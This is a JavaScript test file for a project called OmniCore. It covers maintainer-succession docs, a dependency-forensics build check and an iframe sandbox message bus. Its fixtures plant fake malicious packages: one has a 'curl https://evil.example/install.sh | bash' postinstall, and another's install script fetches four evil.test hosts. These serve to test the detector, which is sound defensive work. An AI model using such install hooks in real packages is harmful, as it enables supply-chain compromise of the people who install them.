import { spawnSync } from 'node:child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import OmniCore from '../src/index.js';

const tempRoots = [];

function writeProjectFile(root, relativePath, content) {
  const filePath = path.join(root, relativePath);
  mkdirSync(path.dirname(filePath), { recursive: true });
  writeFileSync(filePath, content);
}

function makeTempProject(files = {}) {
  const root = mkdtempSync(path.join(tmpdir(), 'omnicore-forensics-'));
  tempRoots.push(root);
  writeProjectFile(root, 'package.json', JSON.stringify({
    name: 'forensics-fixture',
    version: '1.0.0',
    dependencies: {}
  }, null, 2));
  writeProjectFile(root, 'package-lock.json', JSON.stringify({
    name: 'forensics-fixture',
    lockfileVersion: 3,
    packages: {
      '': { name: 'forensics-fixture', version: '1.0.0' }
    }
  }, null, 2));
  for (const [relativePath, content] of Object.entries(files)) {
    writeProjectFile(root, relativePath, content);
  }
  return root;
}

describe('maintainer succession, dependency forensics, and sandbox runtime', () => {
  afterEach(() => {
    document.body.innerHTML = '';
    OmniCore.Bus?.clear?.();
    while (tempRoots.length) {
      rmSync(tempRoots.pop(), { recursive: true, force: true });
    }
  });

  it('documents reviewer auto-promotion and release succession thresholds', () => {
    const maintainers = readFileSync('MAINTAINERS.md', 'utf8');

    expect(maintainers).toContain('近 3 个月');
    expect(maintainers).toContain('20 个有效的测试或 Bug 修复 PR');
    expect(maintainers).toContain('代码审查员');
    expect(maintainers).toContain('贡献者数量超过 3 人');
    expect(maintainers).toContain('发布权限');
    expect(maintainers).toContain('投票门槛');
  });

  it('wires dependency forensics into the build preflight', () => {
    const packageJson = JSON.parse(readFileSync('package.json', 'utf8'));

    expect(packageJson.scripts['dependency:forensics']).toBe('node scripts/dependency-forensics.js');
    expect(packageJson.scripts.prebuild).toMatch(/^npm run dependency:forensics &&/);
  });

  it('flags dependency postinstall scripts with unapproved network execution and writes lock reports', () => {
    const root = makeTempProject({
      'node_modules/evil-pkg/package.json': JSON.stringify({
        name: 'evil-pkg',
        version: '1.0.0',
        scripts: {
          postinstall: 'curl https://evil.example/install.sh | bash'
        }
      }, null, 2)
    });

    const result = spawnSync(process.execPath, [
      'scripts/dependency-forensics.js',
      '--root',
      root
    ], {
      cwd: process.cwd(),
      encoding: 'utf8'
    });

    expect(result.status).toBe(1);
    const reportPath = path.join(root, 'docs/security/dependency-forensics-latest.md');
    const lockPath = path.join(root, 'docs/security/dependency-forensics-lock.json');
    expect(existsSync(reportPath)).toBe(true);
    expect(existsSync(lockPath)).toBe(true);
    expect(readFileSync(reportPath, 'utf8')).toContain('HIGH RISK');
    expect(JSON.parse(readFileSync(lockPath, 'utf8')).locked[0]).toMatchObject({
      name: 'evil-pkg',
      version: '1.0.0',
      reason: expect.stringContaining('postinstall')
    });
  });

  it('flags installer files with excessive unapproved network endpoints', () => {
    const root = makeTempProject({
      'node_modules/noisy-pkg/package.json': JSON.stringify({
        name: 'noisy-pkg',
        version: '2.0.0',
        scripts: {
          postinstall: 'node postinstall.js'
        }
      }, null, 2),
      'node_modules/noisy-pkg/postinstall.js': [
        "fetch('https://one.evil.test/a')",
        "fetch('https://two.evil.test/b')",
        "fetch('https://three.evil.test/c')",
        "fetch('https://four.evil.test/d')"
      ].join('\n')
    });

    const result = spawnSync(process.execPath, [
      'scripts/dependency-forensics.js',
      '--root',
      root
    ], {
      cwd: process.cwd(),
      encoding: 'utf8'
    });

    expect(result.status).toBe(1);
    const report = readFileSync(path.join(root, 'docs/security/dependency-forensics-latest.md'), 'utf8');
    const lock = JSON.parse(readFileSync(path.join(root, 'docs/security/dependency-forensics-lock.json'), 'utf8'));
    expect(report).toContain('excessive-unapproved-network');
    expect(lock.locked[0].name).toBe('noisy-pkg');
  });

  it('starts isolated iframe sandboxes and routes messages through OmniCore.Bus', async () => {
    const firstFrame = document.createElement('iframe');
    const secondFrame = document.createElement('iframe');
    document.body.append(firstFrame, secondFrame);
    const secondPost = vi.spyOn(secondFrame.contentWindow, 'postMessage');
    const first = new OmniCore.Sandbox(firstFrame, { id: 'room-a' });
    const second = new OmniCore.Sandbox(secondFrame, { id: 'room-b' });

    await first.start({ config: { scene: 'arena-a' } });
    await second.start({ config: { scene: 'arena-b' } });

    const seen = [];
    const off = OmniCore.Bus.subscribe('room:event', (message) => seen.push(message));
    first.post('room:event', { tick: 1 });

    expect(seen[0]).toMatchObject({
      channel: 'room:event',
      payload: { tick: 1 },
      source: 'room-a'
    });
    expect(secondPost).toHaveBeenCalledWith(expect.objectContaining({
      type: 'omnicore:sandbox:event',
      channel: 'room:event',
      payload: { tick: 1 },
      source: 'room-a'
    }), '*');
    expect(firstFrame.dataset.omnicoreSandboxId).toBe('room-a');
    expect(secondFrame.dataset.omnicoreSandboxId).toBe('room-b');

    off();
    first.destroy();
    second.destroy();
  });

  it('keeps ten iframe sandbox registrations isolated and removable', async () => {
    const sandboxes = [];
    for (let index = 0; index < 10; index += 1) {
      const frame = document.createElement('iframe');
      document.body.appendChild(frame);
      const sandbox = new OmniCore.Sandbox(frame, { id: `room-${index}` });
      await sandbox.start({ config: { index } });
      sandboxes.push(sandbox);
    }

    expect(OmniCore.Bus.listSandboxes().map((sandbox) => sandbox.id)).toEqual(
      Array.from({ length: 10 }, (_, index) => `room-${index}`)
    );
    sandboxes[4].destroy();
    expect(OmniCore.Bus.listSandboxes().map((sandbox) => sandbox.id)).not.toContain('room-4');
    sandboxes.forEach((sandbox) => sandbox.destroy());
  });
});
